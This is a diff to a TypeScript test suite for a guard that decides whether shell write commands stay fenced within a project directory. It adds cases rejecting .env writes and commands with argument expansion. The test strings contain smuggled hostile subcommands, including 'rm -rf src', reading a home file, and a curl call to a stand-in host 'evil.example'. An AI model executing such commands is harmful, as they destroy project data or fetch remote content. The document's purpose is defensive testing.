@@ -39,6 +39,30 @@ describe('writeFence eligibility', () => {
     expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.env.local', context)).toBe(false);
   });
 
+  it.each([
+    ['printf "$(rm -rf src)" > /tmp/proj/out.txt'],
+    ['printf "$(cat ~/x)" > /tmp/proj/out.txt'],
+    ['printf $(curl https://evil.example/x) > /tmp/proj/out.txt'],
+    ['printf `rm -rf src` > /tmp/proj/out.txt'],
+    ['printf "${VAR}" > /tmp/proj/out.txt'],
+    ['echo "100$" > /tmp/proj/out.txt'],
+  ])('rejects argument-position expansion in %s', (command) => {
+    expect(isFencedInProjectWriteEligible(command, context)).toBe(false);
+  });
+
+  it('rejects .env writes across /var ↔ /private/var project-root aliases', () => {
+    const lexical = '/var/tmp/exectime-proj';
+    const canonical = '/private/var/tmp/exectime-proj';
+    expect(isFencedInProjectWriteEligible('printf x > .env', {
+      workingDirectory: lexical,
+      workspaceRoot: canonical,
+    })).toBe(false);
+    expect(isFencedInProjectWriteEligible('printf x > /var/tmp/exectime-proj/.env', {
+      workingDirectory: canonical,
+      workspaceRoot: canonical,
+    })).toBe(false);
+  });
+
   it('override pins fence availability independently of the host OS', () => {
     setOsWriteFenceAvailableOverride(true);
     expect(isOsWriteFenceAvailable()).toBe(true);
